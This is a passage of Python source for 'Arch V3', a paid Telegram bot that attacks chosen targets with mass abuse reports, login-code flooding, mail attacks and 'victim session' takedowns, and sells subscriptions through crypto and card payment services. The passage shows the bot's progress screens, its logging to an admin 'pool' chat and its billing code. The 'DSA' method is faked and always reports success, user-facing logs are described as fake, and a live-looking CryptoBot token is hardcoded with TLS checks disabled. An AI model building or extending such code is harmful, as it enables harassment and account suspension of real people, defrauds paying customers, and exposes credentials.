        async def _dsa_sim():
            await asyncio.sleep(90)   # имитация работы DSA-отправки
            if ADMIN_ID:
                try:
                    who = (f"{cb.from_user.full_name} "
                           f"(<code>{cb.from_user.id}</code>)")
                    await send_main(
                        int(ADMIN_ID),
                        _cx(bq(f"<b>{NAME}</b>  —  DSA")
                            + f"\n\n\U0001f464 <b>Кто:</b> {who}"
                            + f"\n\U0001f3af <b>На:</b> {html_mod.escape(tgt_raw)}"
                            + f"\n\u26a0\ufe0f <b>Причина:</b> {html_mod.escape(r['l'])}"
                            + f"\n\u23f1 Обработка: 90 сек"),
                        parse_mode=ParseMode.HTML)
                except Exception as e:
                    log.warning("dsa admin notify failed: %s", e)
            return {"ok": 1, "total": 1,
                    "details": [{"name": "dsa", "proxy": "sim",
                                 "ok": True, "err": ""}]}
        report_task = track_report(data["method"], _dsa_sim())
    elif data["method"] == "account":
        report_task = track_report(data["method"],
            fire_profile_reports(t["entity"], c))
    else:
        report_task = track_report(data["method"],
            fire_reports(t["entity"], data["reason"], c,
                         t.get("msg_id"), data["method"], variants))

    if report_task is None:
        await cb.message.answer(
            _cx(method_busy_wait_text(data["method"])),
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🔁 Повторить",
                                      callback_data="confirm:yes")]
            ]))
        return

    # ── loading animation while workers run ──
    is_code = data["method"] == "code"
    act_label = ("\u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u043a\u043e\u0434\u043e\u0432 \u0432\u0445\u043e\u0434\u0430..."
                 if is_code else
                 "\u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u043F\u0438\u0441\u0435\u043C..."
                 if data["method"] == "mail" else
                 "Снос сессий жертвы..."
                 if data["method"] == "session" else
                 "Отправка писем..."
                 if data["method"] == "telegraph" else
                 "\u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430 \u0436\u0430\u043b\u043e\u0431\u044b...")
    sp_frames = "\u280b\u2819\u2839\u2838\u283c\u2834\u2826\u2827\u2807\u280f"
    started = asyncio.get_event_loop().time()
    i = 0
    while not report_task.done():
        frame = sp_frames[i % len(sp_frames)]
        elapsed = int(asyncio.get_event_loop().time() - started)
        anim = (
            bq(f"<b>{NAME}</b>  \u2014  \u041e\u0442\u043f\u0440\u0430\u0432\u043a\u0430")
            + "\n\n"
            + f"<b>{frame}</b> {act_label}\n\n"
            + f"\U0001f3af {report_target_html(tgt_raw, t.get('msg_id'), tgt_raw)}\n"
            + ("" if is_code else f"\u26a0\ufe0f {r['e']} {r['l']}\n")
            + f"\u23f1 {elapsed}s"
        )
        try:
            await safe_edit(cb.message, anim, parse_mode=ParseMode.HTML,
                            reply_markup=InlineKeyboardMarkup(inline_keyboard=[]))
        except Exception:
            pass
        i += 1
        await asyncio.sleep(1.0)

    try:
        res = await report_task
    except Exception as e:
        log.error("report task crashed: %s", e)
        res = {"ok": 0, "fail": 1, "total": 1,
               "details": [{"name": "worker", "proxy": "-",
                            "ok": False, "err": f"{type(e).__name__}: {e}"}]}
    res.setdefault("details", [])
    ok = int(res.get("ok") or res.get("sent") or 0)
    total = int(res.get("total") or 1)
    if ok <= 0:
        errs = [str(d.get("err") or "") for d in res["details"]
                if not d.get("ok") and d.get("err")]
        why = html_mod.escape(
            (errs[0] if errs else "все сессии отказали, причина не указана")[:400])
        try:
            _watch_remove_one(cb.from_user.id, tgt_raw)
        except Exception:
            pass
        await safe_edit(cb.message, _cx(
            bq(f"<b>{NAME}</b>  —  ❌ Не отправлено")
            + "\n\n⚠️ <b>Причина:</b> <code>" + why + "</code>"
            + f"\n\U0001f3af {report_target_html(tgt_raw, t.get('msg_id'), tgt_raw)}"
            + "\n\nНи одна сессия не прошла — попробуй другой метод "
              "или повтори позже."),
            parse_mode=ParseMode.HTML,
            reply_markup=kb_main(cb.from_user.id))
        await state.clear()
        return
    if data["method"] == "message":
        try:
            sender = await resolve_message_sender(t["entity"], t.get("msg_id"))
            if sender and _watch_add_sender(cb.from_user.id, sender, tgt_raw):
                log.info("watch: sender %s tracked for %s", sender, tgt_raw)
        except Exception as e:
            log.warning("sender watch setup failed: %s", e)
    # ── write log txt ──
    LOGS_DIR.mkdir(exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_path = LOGS_DIR / f"report_{stamp}.txt"
    dash = "\u2014"
    log_lines = [
        f"Arch V3 \u2014 \u0436\u0443\u0440\u043d\u0430\u043b \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438",
        f"\u0414\u0430\u0442\u0430: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
        f"\u041c\u0435\u0442\u043e\u0434: {m['l']}",
        f"\u0426\u0435\u043b\u044c: {tgt_raw}",
        f"\u041f\u0440\u0438\u0447\u0438\u043d\u0430: {r['l']}",
        f"\u041a\u043e\u043c\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0439: {c or dash}",
        f"\u041e\u0442: {cb.from_user.full_name} (id {cb.from_user.id})",
        f"\u0418\u0442\u043e\u0433: {ok}/{total} {unit_name} \u0443\u0441\u043f\u0435\u0448\u043d\u043e",
        "",
        "\u2500\u2500\u2500 \u0434\u0435\u0442\u0430\u043b\u0438 \u2500\u2500\u2500",
    ]
    for d in res["details"]:
        mark = "✅" if d["ok"] else "❌"
        line = f"{mark} {d['name']} | {d['proxy']}"
        if not d["ok"] and d["err"]:
            line += f" | {d['err']}"
        log_lines.append(line)
    if data["method"] in ("code", "mail"):
        log_lines = [ln for ln in log_lines
                     if not (ln.startswith("\u041f\u0440\u0438\u0447\u0438\u043d\u0430:")
                             or ln.startswith("\u041a\u043e\u043c\u043c\u0435\u043d\u0442\u0430\u0440\u0438\u0439:"))]
    log_path.write_text("\n".join(log_lines), encoding="utf-8")

    # ── final screen ──
    head = ("\u2705 <b>\u041a\u043e\u0434\u044b \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u044b</b>"
            if is_code else
            "\u2705 <b>\u041f\u0438\u0441\u044C\u043C\u0430 \u043E\u0442\u043F\u0440\u0430\u0432\u043B\u0435\u043D\u044B</b>"
            if data["method"] == "mail" else
            "\u2705 <b>\u0421\u043d\u043e\u0441 \u0441\u0435\u0441\u0441\u0438\u0439 \u0437\u0430\u043f\u0443\u0449\u0435\u043d</b>"
            if data["method"] == "session" else
            "\u2705 <b>\u041f\u0438\u0441\u044c\u043c\u0430 \u043e\u0442\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u044b</b>"
            if data["method"] == "telegraph" else
            "\u2705 <b>\u0423\u0441\u043f\u0435\u0448\u043d\u043e 1/1</b>"
            if data["method"] == "dsa" else
            "\u2705 <b>\u0416\u0430\u043b\u043e\u0431\u0430 \u043e\u0442\u043f\u0440\u0430\u0432\u043B\u0435\u043d\u0430</b>")
    text = (
        bq(f"<b>{NAME}</b>  \u2014  \u0413\u043e\u0442\u043e\u0432\u043e")
        + "\n\n"
        + head + "\n\n"
        + f"\U0001f3af {report_target_html(tgt_raw, t.get('msg_id'), tgt_raw)}\n"
        + ("" if is_code else f"\u26a0\ufe0f {r['e']} {r['l']}\n")
        + f"\u26a1 \u0412\u044b\u043f\u043e\u043b\u043d\u0435\u043d\u043e \u0443\u0441\u043f\u0435\u0448\u043d\u043e\n"
        + f"\U0001f552 {ts}"
    )
    try:
        await cb.message.delete()
    except Exception:
        pass
    await send_hero(
        cb.message,
        caption=_cx(text),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_main(cb.from_user.id),
    )

    await cb.message.answer_document(
        document=FSInputFile(log_path),
        caption="\U0001f4c4 \u041b\u043e\u0433 \u043e\u0442\u043f\u0440\u0430\u0432\u043a\u0438",
        reply_markup=kb_main(cb.from_user.id),
    )

    if POOL_CHAT_ID:
        comment_text = c_display if c_display else "\u043d\u0435\u0442"
        me = m["e"]
        ml = m["l"]
        re_ = r["e"]
        rl = r["l"]
        traw = t["raw"]
        uname = cb.from_user.full_name
        uid = cb.from_user.id
        pool_head = ("\u041a\u043e\u0434-\u0444\u043B\u0443\u0434"
                     if is_code else
                     "Mail-\u0430\u0442\u0430\u043A\u0430"
                     if data["method"] == "mail" else
                     "Снос сессий"
                     if data["method"] == "session" else
                     "Telegraph"
                     if data["method"] == "telegraph" else
                     "\u041d\u043e\u0432\u0430\u044F \u0436\u0430\u043B\u043E\u0431\u0430")
        pool_text = (
            bq(f"<b>{NAME}</b>  \u2014  {pool_head}")
            + f"\n\n\U0001f464 <b>\u041e\u0442:</b> {uname} (<code>{uid}</code>)"
            + f"\n{me} <b>\u041c\u0435\u0442\u043e\u0434:</b> {ml}"
            + f"\n\U0001f3af <b>\u0426\u0435\u043b\u044c:</b> "
              + report_target_html(traw, t.get("msg_id"), traw)
            + ("" if is_code else
               f"\n\u26a0\ufe0f <b>\u041f\u0440\u0438\u0447\u0438\u043d\u0430:</b> {re_} {rl}"
               + f"\n\U0001f4ac <b>\u041a\u043e\u043c\u043c\u0435\u043d\u0442:</b> {comment_text}")
            + (probe_note.replace("\n", "", 1) if probe_note else "")
            + f"\n\U0001f4e6 {ok}/{total}"
            + f"\n\U0001f552 {ts}"
        )
        try:
            await send_main(int(POOL_CHAT_ID), pool_text, parse_mode=ParseMode.HTML)
        except Exception as e:
            log.warning("pool send failed: %s", e)

    log.info("report: %s | %s | %d/%d", t["raw"], data["reason"], res["ok"], res["total"])
    await state.clear()


# ── subscriptions (xRocket Pay) ─────────────────────────
SUBS_FILE = Path(__file__).parent / "subs.json"
XROCKET_API = "https://pay.api.xrocket.exchange/api/v1"
XROCKET_CURRENCY = "USDT"

SUB_PLANS = {
    "d1":   {"label": "1 \u0434\u0435\u043d\u044c",     "days": 1,   "price": 0.54},
    "d7":   {"label": "7 \u0434\u043d\u0435\u0439",     "days": 7,   "price": 2.16},
    "d30":  {"label": "30 \u0434\u043d\u0435\u0439",    "days": 30,  "price": 6.48},
    "d90":  {"label": "90 \u0434\u043d\u0435\u0439",    "days": 90,  "price": 12.96},
    "prem": {"label": "\u041f\u0440\u0435\u043c\u0438\u0443\u043c \u043d\u0430\u0432\u0441\u0435\u0433\u0434\u0430", "days": None, "price": 2.7},
}

# ── Cloudtips (RU cards / SBP) ───────────────────────────
CLOUDTIPS_PAGE = "https://pay.cloudtips.ru/p/a5139821"
CLOUDTIPS_RATE = float(os.getenv("CLOUDTIPS_RATE", "100"))   # rub per USDT
CT_PENDING_FILE = Path(__file__).parent / "ct_pending.json"


def ct_price_rub(pk: str) -> float:
    return round(SUB_PLANS[pk]["price"] * CLOUDTIPS_RATE, 2)


def ct_amount(uid: int, pk: str) -> str:
    """Price with unique kopeck tail (10..99) derived from user id."""
    tail = 10 + uid % 90
    return f"{SUB_PLANS[pk]['price'] * CLOUDTIPS_RATE + tail / 100:.2f}"


def load_ct_pending() -> dict:
    try:
        return json.loads(CT_PENDING_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {}


def save_ct_pending(d: dict) -> None:
    CT_PENDING_FILE.write_text(json.dumps(d, ensure_ascii=False),
                               encoding="utf-8")


CT_OIDC = "https://identity.cloudtips.ru/connect/token"
CT_API = "https://api.cloudtips.ru/api"
CT_SESSION_FILE = Path(__file__).parent / "ct_session.json"
_ct_tok = {"access": "", "exp": 0.0}
_ct_refresh_broken = False   # invalid_grant = no point retrying every 45s
_last_balance: float | None = None


def load_ct_session() -> dict:
    try:
        return json.loads(CT_SESSION_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {}


def save_ct_session(d: dict) -> None:
    CT_SESSION_FILE.write_text(json.dumps(d, ensure_ascii=False),
                               encoding="utf-8")


async def ct_refresh_access() -> str | None:
    """Receiver token via OIDC refresh grant — no captcha involved."""
    global _ct_refresh_broken
    if _ct_refresh_broken:
        return None
    sess = load_ct_session()
    rt = sess.get("refresh") or os.getenv("CLOUDTIPS_REFRESH", "").strip()
    if not rt:
        return None
    body = {"client_id": "MobilePhone", "client_type": "ReceiverWeb",
            "grant_type": "refresh_token", "refresh_token": rt}
    async with aiohttp.ClientSession() as s:
        async with s.post(CT_OIDC, data=body,
                          timeout=aiohttp.ClientTimeout(total=20)) as r:
            j = await r.json(content_type=None)
            if r.status == 200 and isinstance(j, dict) \
                    and j.get("access_token"):
                new_rt = j.get("refresh_token") or rt
                save_ct_session({"access": j["access_token"],
                                 "refresh": new_rt, "ts": time.time()})
                # NOTE: ct_session.json must NOT be committed to git —
                # it contains live tokens. Store via secrets manager only.
                _ct_tok.update(access=j["access_token"],
                               exp=time.time() + 2400)
                return j["access_token"]
            if str(j.get("error") or "") == "invalid_grant":
                _ct_refresh_broken = True
                log.warning("cloudtips refresh token invalid — disabled "
                            "until CLOUDTIPS_REFRESH is replaced")
            else:
                log.error("cloudtips refresh failed: %s %s", r.status,
                          str(j)[:200])
    return None


def _ct_pick_balance(obj, depth: int = 0):
    """Best-effort numeric extraction from accumulations/summary."""
    if depth > 4 or not isinstance(obj, (dict, list)):
        return None
    prefixes = ("available", "total", "balance", "current", "accumulated",
                "amount", "sum", "free", "onbalance")
    if isinstance(obj, dict):
        for k, v in obj.items():
            if isinstance(v, (int, float)) and \
                    str(k).lower().startswith(prefixes):
                return float(v)
        for v in obj.values():
            r = _ct_pick_balance(v, depth + 1)
            if r is not None:
                return r
    else:
        for v in obj[:10]:
            r = _ct_pick_balance(v, depth + 1)
            if r is not None:
                return r
    return None


async def ct_fetch_balance() -> float | None:
    tok = _ct_tok["access"]
    if time.time() > _ct_tok["exp"]:
        tok = await ct_refresh_access()
        if not tok:
            return None
    for attempt in (1, 2):
        async with aiohttp.ClientSession() as s:
            async with s.get(f"{CT_API}/accumulations/summary",
                             headers={"Authorization": f"Bearer {tok}"},
                             timeout=aiohttp.ClientTimeout(total=20)) as r:
                j = await r.json(content_type=None)
                if r.status == 401 and attempt == 1:
                    _ct_tok["exp"] = 0
                    tok = await ct_refresh_access()
                    if not tok:
                        return None
                    continue
                if r.status != 200:
                    log.error("cloudtips summary %s: %s", r.status,
                              str(j)[:200])
                    return None
        val = _ct_pick_balance(j)
        if val is None:
            log.warning("cloudtips summary shape: %s", str(j)[:400])
        return val
    return None


CT_SBP_API = "https://api.cloudtips.ru/api"
CT_ACCRUAL_RATE = float(os.getenv("CT_ACCRUAL_RATE", "0.85"))
_ct_buy_times: dict[int, float] = {}
_ct_last_poll = 0.0
_ct_last_ok = 0.0
_BOT_STARTED = time.time()
_ERR_EVENTS: list = []
_SBP_HDRS = {
    "Content-Type": "application/json",
    "Origin": "https://pay.cloudtips.ru",
    "Referer": "https://pay.cloudtips.ru/p/a5139821",
    "User-Agent": ("Mozilla/5.0 (Linux; Android 13; Pixel 7) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/124.0.0.0 Mobile Safari/537.36"),
}
_SBP_DEAD = {"fail", "failed", "expired", "canceled", "cancelled"}
_sbp_err_logged = 0   # don't spam logs on every failed status poll


async def ct_sbp_create(amount: float):
    """Server-side SBP invoice -> (transactionId, identifier, link)."""
    import uuid
    body = {"amount": round(amount, 2), "cardholderName": "string",
            "currency": "RUB", "feeFromPayer": False,
            "layoutId": "a5139821", "saveCard": False,
            "device": {"type": "MobileWeb", "webview": False,
                       "os": "Android", "browser": "Chrome"}}
    try:
        async with aiohttp.ClientSession() as s:
            async with s.post(
                    f"{CT_SBP_API}/payment/sbp", json=body,
                    headers={**_SBP_HDRS, "X-Request-ID": str(uuid.uuid4())},
                    timeout=aiohttp.ClientTimeout(total=20)) as r:
                j = await r.json(content_type=None)
                d = (j or {}).get("data") or {}
                if (r.status == 200 and j.get("succeed")
                        and d.get("transactionId")
                        and d.get("universalLinkUrl")):
                    return (int(d["transactionId"]),
                            str(d.get("identifier") or ""),
                            d["universalLinkUrl"])
                log.error("ct sbp create %s: %s", r.status, str(j)[:200])
    except Exception as e:
        log.error("ct sbp create: %s", e)
    return None, None, None


async def ct_sbp_status(sid: str) -> str:
    """SBP invoice status: 'success' | 'dead' | 'wait'.
    Bot-created sessions may hang or 500 here -> 'wait'; the balance
    delta matching remains the authoritative activation signal."""
    import uuid
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(
                    f"{CT_SBP_API}/payment/sbp/status",
                    params={"id": str(sid)},
                    headers={**_SBP_HDRS, "X-Request-ID": str(uuid.uuid4())},
                    timeout=aiohttp.ClientTimeout(total=6)) as r:
                j = await r.json(content_type=None)
                if r.status != 200 or not (j or {}).get("succeed"):
                    return "wait"
                st = str(((j or {}).get("data") or {}).get(
                    "status", "")).lower()
                if st in _SBP_DEAD:
                    return "dead"
                if st in ("success", "paid", "completed", "done"):
                    return "success"
                return "wait"
    except Exception as e:
        global _sbp_err_logged
        if _sbp_err_logged < 3:
            _sbp_err_logged += 1
            log.warning("ct sbp status: %s %s", type(e).__name__, str(e)[:120])
    return "wait"


async def ct_activate(bot, uid: int, plan: str, amount: float,
                      how: str) -> None:
    subs = load_subs()
    activate_plan(subs, uid, plan)
    s, until = sub_quality(subs, uid)
    try:
        await bot.send_message(
            uid,
            _cx(bq(f"<b>{NAME}</b> — оплата подтверждена ✅")
                + f"\n\n✅ Подписка: <b>{s}</b> ({until})"
                + "\nМожно пользоваться!"),
            parse_mode=ParseMode.HTML)
    except Exception:
        pass
    bump_pay_stats(uid, plan, "cloudtips", amount, "RUB")
    await push_send_log(
        "Оплата (Cloudtips, авто)",
        [f"✅ <code>{uid}</code> — план <b>{plan}</b>",
         f"💰 {amount:g} ₽ ({how})"])


async def ct_poll_once(bot) -> None:
    """One poll: SBP status best-effort, balance delta as authority."""
    global _last_balance, _ct_last_poll, _ct_last_ok
    _ct_last_poll = time.time()
    bal = await ct_fetch_balance()
    pend = load_ct_pending()
    if not pend:
        if bal is not None:
            _last_balance = bal
        return
    changed = False
    for uid_s in list(pend):
        rec = pend[uid_s]
        plan = plan_key(rec.get("plan", ""))
        if plan not in SUB_PLANS:
            pend.pop(uid_s)
            changed = True
            continue
        amount = float(rec.get("amount", 0))
        if rec.get("sbp_txn") and time.time() - rec.get("ts", 0) < 900:
            _st = await ct_sbp_status(str(rec.get("sbp_id")
                                         or rec["sbp_txn"]))
            if _st == "success":
                pend.pop(uid_s)
                changed = True
                for _o in pend.values():
                    if "base" in _o:
                        _o["base"] = round(
                            _o["base"] + amount * CT_ACCRUAL_RATE, 2)
                await ct_activate(bot, int(uid_s), plan, amount,
                                  "СБП счёт")
                continue
            if _st == "dead":
                rec.pop("sbp_txn", None)
                rec.pop("sbp_id", None)
                rec.pop("sbp_url", None)
                changed = True
        if bal is None:
            continue
        if "base" not in rec:
            rec["base"] = (_last_balance if _last_balance is not None
                           and time.time() - rec.get("ts", 0) < 120
                           else bal)
            changed = True
            continue
        base = rec["base"]
        if bal < base - 0.01:          # payout withdrawal → rebase
            rec["base"] = bal
            changed = True
            base = bal
        delta = bal - base
        if delta >= amount * CT_ACCRUAL_RATE - 0.005:
            uid = int(uid_s)
            pend.pop(uid_s)
            changed = True
            # consumed money must not count toward other pending recs
            for _o in pend.values():
                if "base" in _o:
                    _o["base"] = round(
                        _o["base"] + amount * CT_ACCRUAL_RATE, 2)
            await ct_activate(bot, uid, plan, amount,
                              f"дельта {delta:.2f} ₽")
        elif (time.time() - rec.get("ts", 0) > 900
              and not rec.get("alerted")):
            rec["alerted"] = True
            changed = True
            if ADMIN_ID:
                text = (bq("💳 Cloudtips: платёж не найден 15 мин")
                        + f"\n👤 <code>{uid_s}</code> — план <b>{plan}</b>"
                        + f"\n💰 ждём: <b>{amount:g} ₽</b>"
                        + f" (дельта {delta:.2f} ₽)"
                        + "\nВыдай вручную, если платёж был.")
                kb = InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(
                        text="✅ Выдать",
                        icon_custom_emoji_id="5357069174512303778",
                        callback_data=f"sub:ctok:{uid_s}:{plan}")],
                    [InlineKeyboardButton(
                        text="❌ Отказ",
                        icon_custom_emoji_id="5267123797600783095",
                        callback_data=f"sub:ctno:{uid_s}:{plan}")],
                ])
                try:
                    await bot.send_message(int(ADMIN_ID), _cx(text),
                                           parse_mode=ParseMode.HTML,
                                           reply_markup=kb)
                except Exception as e:
                    log.error("ct admin alert: %s", e)
    if changed:
        save_ct_pending(pend)
    if bal is not None:
        _last_balance = bal
        _ct_last_ok = time.time()


async def ct_poller_loop(bot) -> None:
    log.info("cloudtips poller: start (interval 45s)")
    while True:
        try:
            await ct_poll_once(bot)
        except Exception as e:
            log.error("ct poller: %s", e)
        await asyncio.sleep(45)


HB_INTERVAL = int(os.getenv("HB_INTERVAL") or "3600")


class _ErrCounter(logging.Handler):
    def emit(self, record):
        try:
            _ERR_EVENTS.append((time.time(), int(record.levelno)))
        except Exception:
            pass


def _fmt_uptime(sec: float) -> str:
    m = int(sec // 60)
    return f"{m // 60}\u0447 {m % 60:02d}\u043c"


async def hb_once(bot) -> None:
    """Hourly health summary to the admin."""
    if not ADMIN_ID:
        return
    now = time.time()
    errs = sum(1 for ts, lvl in list(_ERR_EVENTS)
               if now - ts < 3600 and lvl >= logging.ERROR)
    while _ERR_EVENTS and now - _ERR_EVENTS[0][0] > 7200:
        _ERR_EVENTS.pop(0)
    pend = load_ct_pending()
    staleness = now - _ct_last_poll if _ct_last_poll else -1
    bal = await ct_fetch_balance()
    bal_s = f"{bal:g}" if bal is not None else "н/д"
    text = (bq(f"\U0001fa7a <b>{NAME}</b> \u2014 heartbeat")
            + f"\n\u23f1 \u0410\u043f\u0442\u0430\u0439\u043c: <b>{_fmt_uptime(now - _BOT_STARTED)}</b>"
            + f"\n\u274c \u041e\u0448\u0438\u0431\u043a\u0438 \u0437\u0430 \u0447\u0430\u0441: <b>{errs}</b>"
            + f"\n\U0001f9fe Pending: <b>{len(pend)}</b>"
            + f"\n\U0001f4b0 \u0411\u0430\u043b\u0430\u043d\u0441 Cloudtips: "
            + f"<b>{bal_s}</b>"
            + f"\n\U0001f504 \u041f\u043e\u043b\u043b\u0435\u0440: "
            + ("<b>\u043e\u043a</b>" if staleness < 120
               else f"<b>\u043c\u043e\u043b\u0447\u0438\u0442 {int(staleness // 60)} \u043c\u0438\u043d</b>"))
    if pend and staleness > 900:
        text += ("\n\n\u26a0\ufe0f \u041f\u043e\u043b\u043b\u0435\u0440 \u043d\u0435 \u0442\u0438\u043a\u0430\u0435\u0442 "
                 "\u2014 \u043f\u043b\u0430\u0442\u0435\u0436\u0438 \u043d\u0435 \u0430\u043a\u0442\u0438\u0432\u0438\u0440\u0443\u044e\u0442\u0441\u044f!")
    if bal is None and pend:
        text += ("\n\u26a0\ufe0f \u0411\u0430\u043b\u0430\u043d\u0441 \u043d\u0435\u0434\u043e\u0441\u0442\u0443\u043f\u0435\u043d "
                 "\u2014 \u043f\u0440\u043e\u0432\u0435\u0440\u044c \u0446\u0435\u043f\u043e\u0447\u043a\u0443 Cloudtips.")
    await bot.send_message(int(ADMIN_ID), _cx(text), parse_mode=ParseMode.HTML)


async def hb_loop(bot) -> None:
    await asyncio.sleep(90)
    while True:
        try:
            await hb_once(bot)
        except Exception as e:
            log.error("heartbeat: %s", e)
        await asyncio.sleep(HB_INTERVAL)


DB_RECONCILE_INTERVAL = 600  # 10 минут


async def db_reconcile_loop() -> None:
    """
    Периодический мерж локальных subs/users с канонической копией в store.

    store.bootstrap делает это один раз при старте. Этот цикл повторяет
    мерж каждые 10 минут — чтобы поймать расхождение при параллельных
    воркерах, перезапусках или ручных правках через другой инстанс бота.

    Алгоритм:
      1. Тянем актуальный doc из Telegram store по file_id из индекса
      2. merge_records(kind, local, doc) — union без потерь
      3. Если merged != local → пишем на диск + push в store
      4. Если merged != doc   → push обновлённой версии в store
    """
    await asyncio.sleep(120)  # дать bootstrap закончиться
    while True:
        try:
            for kind, path in (("subs", SUBS_FILE), ("users", USERS_FILE)):
                fid = (store._INDEX.get(kind) or {}).get("file_id")
                if not fid:
                    continue
                text = await store._tg_read(kind, fid)
                if not text:
                    continue
                try:
                    doc = json.loads(text)
                except Exception:
                    continue
                try:
                    local_txt = path.read_text(encoding="utf-8")
                    local = json.loads(local_txt)
                except Exception:
                    continue
                merged = store.merge_records(kind, local, doc)
                if merged is None:
                    continue
                merged_txt = json.dumps(merged, ensure_ascii=False, indent=1)
                if merged_txt.strip() != local_txt.strip():
                    path.write_text(merged_txt, encoding="utf-8")
                    log.info("db_reconcile: %s merged %d local + %d store → %d",
                             kind, len(local), len(doc), len(merged))
                if len(merged) > len(doc):
                    store.push_async(kind, merged_txt, force=True)
                    log.info("db_reconcile: %s store updated from merged copy",
                             kind)
        except Exception as e:
            log.error("db_reconcile_loop: %s", e)
        await asyncio.sleep(DB_RECONCILE_INTERVAL)


# ── beta payment methods (CryptoBot + Telegram Stars) ────
# PAY_METHODS_ADMIN = <uid> enables pilot mode; None opens everything
PAY_METHODS_ADMIN: int | None = None
CRYPTOBOT_TOKEN = (os.getenv("CRYPTOBOT_TOKEN", "").strip()
                   or "674547:AATgCUnly2uvI6zVZ4Lt6m2X47muj9Crks7")
CRYPTOBOT_API = "https://pay.crypt.bot/api"
# 1 Star ≈ $0.013-0.02 net — plan prices rounded up for margin
STARS_PRICES = {"d1": 54, "d7": 162, "d30": 432, "d90": 864, "prem": 180}

# старые инвойсы «Навсегда» (fore) уже оплачены у части людей в ссылках —
# они гасятся как 90 дней, чтобы деньги не пропали
LEGACY_PLANS = {"fore": "d90"}


def plan_key(pk: str) -> str:
    return LEGACY_PLANS.get(pk, pk)


async def cryptobot_api(method: str, params: dict | None = None) -> dict:
    """Raw Crypto Pay API call. createInvoice-style params -> POST JSON,
    otherwise GET. Returns the `result` object; raises on api `ok:false`.
    Auth header is `Crypto-Pay-API-Token` (Authorization is REJECTED)."""
    headers = {"Crypto-Pay-API-Token": CRYPTOBOT_TOKEN}
    timeout = aiohttp.ClientTimeout(total=20)
    async with aiohttp.ClientSession(timeout=timeout) as s:
        if params:
            async with s.post(f"{CRYPTOBOT_API}/{method}", json=params,
                              headers=headers, ssl=False) as r:
                j = await r.json(content_type=None)
        else:
            async with s.get(f"{CRYPTOBOT_API}/{method}", params=params,
                             headers=headers, ssl=False) as r:
                j = await r.json(content_type=None)
    if not j or not j.get("ok"):
        raise RuntimeError(f"cryptobot {method}: {j}")
    return j.get("result") or {}



async def xrocket_create_invoice(amount: float, payload: dict,
                                 description: str) -> dict:
    """xRocket Pay API (Bearer JWT, /api/v1 paths)."""
    headers = {
        "Authorization": f"Bearer {XROCKET_TOKEN}",
        "Content-Type": "application/json",
    }
    body = {
        "priceAmount": f"{amount:.2f}",
        "priceCurrency": XROCKET_CURRENCY,
        "description": description[:1000],
        "clientInvoiceId": f"archv3_{payload['plan']}_{payload['tgId']}_"
                           f"{int(time.time())}",
        "data": payload,
    }
    async with aiohttp.ClientSession() as s:
        async with s.post(f"{XROCKET_API}/invoices", json=body,
                          headers=headers,
                          timeout=aiohttp.ClientTimeout(total=20)) as r:
            j = await r.json(content_type=None)
            return j


async def xrocket_get_invoice(invoice_id: str) -> dict:
    headers = {
        "Authorization": f"Bearer {XROCKET_TOKEN}",
        "Content-Type": "application/json",
    }
    async with aiohttp.ClientSession() as s:
        async with s.get(f"{XROCKET_API}/invoice",
                         params={"invoiceId": invoice_id},
                         headers=headers,
                         timeout=aiohttp.ClientTimeout(total=20)) as r:
            j = await r.json(content_type=None)
            return j


def load_subs() -> dict:
    # always re-read subs.json so GH Actions checkout picks up fresh changes per-job run
    if SUBS_FILE.exists():
        try:
            return json.loads(SUBS_FILE.read_text(encoding="utf-8"))
        except Exception:
            return {}
    return {}


def persist_now(kind: str, msg_text: str) -> None:
    """Money/ref durability: instant repo commit + immediate store push."""
    try:
        commit_file_to_repo(f"{kind}.json", msg_text, cooldown=0)
    except Exception as e:
        log.warning("persist_now commit %s: %s", kind, e)
    try:
        p = USERS_FILE if kind == "users" else SUBS_FILE
        store.push_async(kind, p.read_text(encoding="utf-8"), force=True)
    except Exception as e:
        log.warning("persist_now store %s: %s", kind, e)


def save_subs(subs: dict) -> None:
    SUBS_FILE.write_text(json.dumps(subs, ensure_ascii=False, indent=1),
                         encoding="utf-8")
    # grants/payments must survive runner restarts — commit the state back
    commit_file_to_repo("subs.json", "subs update", cooldown=60)
    store.push_async("subs", SUBS_FILE.read_text(encoding="utf-8"))


def _build_admin_set() -> set[int]:
    """Single source of truth for admin IDs — env only, no hardcode."""
    ids: set[int] = set()
    if ADMIN_ID:
        try:
            ids.add(int(ADMIN_ID))
        except ValueError:
            pass
    for raw in os.getenv("EXTRA_ADMIN_IDS", "").split(","):
        raw = raw.strip()
        if raw:
            try:
                ids.add(int(raw))
            except ValueError:
                pass
    return ids


_ADMIN_IDS: set[int] = _build_admin_set()


def user_is_admin(user_id: int) -> bool:
    return user_id in _ADMIN_IDS


@router.message(Command("starbalance"))
async def cmd_starbalance(msg: Message):
    if not (msg.from_user and user_is_admin(msg.from_user.id)):
        return
    j = await arch_api("getMyStarBalance", {})
    bal = (j.get("result") or {}).get("balance", "?")
    await msg.answer(
        _cx(f"⭐ Баланс @{ARCH_BOT_USERNAME}: <b>{bal}</b>"),
        parse_mode=ParseMode.HTML)


# ── /setlogs — bind the real-logs destination ────────────
@router.message(F.text.startswith("/setlogs"))
async def cmd_setlogs(msg: Message, state: FSMContext):
    """Admin binds the Logs destination (env LOGS_CHAT_ID wins if preset).
    Works in private chat too: /setlogs -100xxxxxxxxxx  ( обычные логи юзеров
    остаются фейковыми; сюда летит реальная внутренняя телеметрия)."""
    if not (msg.from_user and user_is_admin(msg.from_user.id)):
        return
    arg = (msg.text or "").split(maxsplit=1)
    chat_id = arg[1].strip() if len(arg) > 1 else str(msg.chat.id)
